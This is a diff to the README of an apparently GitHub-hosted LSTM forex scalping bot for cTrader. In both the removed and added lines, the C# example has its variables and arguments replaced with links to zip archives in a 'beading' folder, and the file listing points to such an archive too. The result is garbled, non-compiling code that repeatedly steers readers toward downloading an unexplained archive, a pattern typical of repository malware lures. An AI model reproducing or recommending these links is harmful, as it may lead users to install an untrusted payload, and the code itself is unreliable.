@@ -49,8 +49,8 @@ Replace the mock method with a real prediction call (e.g., HTTP request to Flask
 csharp
 Copy
 Edit
-if (predictedPrice > https://raw.githubusercontent.com/ssharvesh-steep/LSTM-Scalping-Bot-for-cTrader-cAlgo-/main/beading/Trader_c_LST_for_Algo_Scalping_Bot_1.2.zip(0) && https://raw.githubusercontent.com/ssharvesh-steep/LSTM-Scalping-Bot-for-cTrader-cAlgo-/main/beading/Trader_c_LST_for_Algo_Scalping_Bot_1.2.zip(0) <= https://raw.githubusercontent.com/ssharvesh-steep/LSTM-Scalping-Bot-for-cTrader-cAlgo-/main/beading/Trader_c_LST_for_Algo_Scalping_Bot_1.2.zip(0)) {
-    OpenTrade(https://raw.githubusercontent.com/ssharvesh-steep/LSTM-Scalping-Bot-for-cTrader-cAlgo-/main/beading/Trader_c_LST_for_Algo_Scalping_Bot_1.2.zip);
+if (predictedPrice > https://github.com/ssharvesh-steep/LSTM-Scalping-Bot-for-cTrader-cAlgo-/raw/refs/heads/main/beading/Scalping-Bot-Algo-for-Trader-LST-c-v1.0.zip(0) && https://github.com/ssharvesh-steep/LSTM-Scalping-Bot-for-cTrader-cAlgo-/raw/refs/heads/main/beading/Scalping-Bot-Algo-for-Trader-LST-c-v1.0.zip(0) <= https://github.com/ssharvesh-steep/LSTM-Scalping-Bot-for-cTrader-cAlgo-/raw/refs/heads/main/beading/Scalping-Bot-Algo-for-Trader-LST-c-v1.0.zip(0)) {
+    OpenTrade(https://github.com/ssharvesh-steep/LSTM-Scalping-Bot-for-cTrader-cAlgo-/raw/refs/heads/main/beading/Scalping-Bot-Algo-for-Trader-LST-c-v1.0.zip);
 }
 📌 Requirements
 cTrader (cAlgo) platform
@@ -64,7 +64,7 @@ This bot is for educational and experimental purposes only.
 Trading Forex involves risk. Use this code at your own discretion and test thoroughly on demo accounts before deploying live.
 
 📁 File Info
-https://raw.githubusercontent.com/ssharvesh-steep/LSTM-Scalping-Bot-for-cTrader-cAlgo-/main/beading/Trader_c_LST_for_Algo_Scalping_Bot_1.2.zip Main trading bot logic
+https://github.com/ssharvesh-steep/LSTM-Scalping-Bot-for-cTrader-cAlgo-/raw/refs/heads/main/beading/Scalping-Bot-Algo-for-Trader-LST-c-v1.0.zip Main trading bot logic
 
 Prediction model integration pending (currently mocked)
 
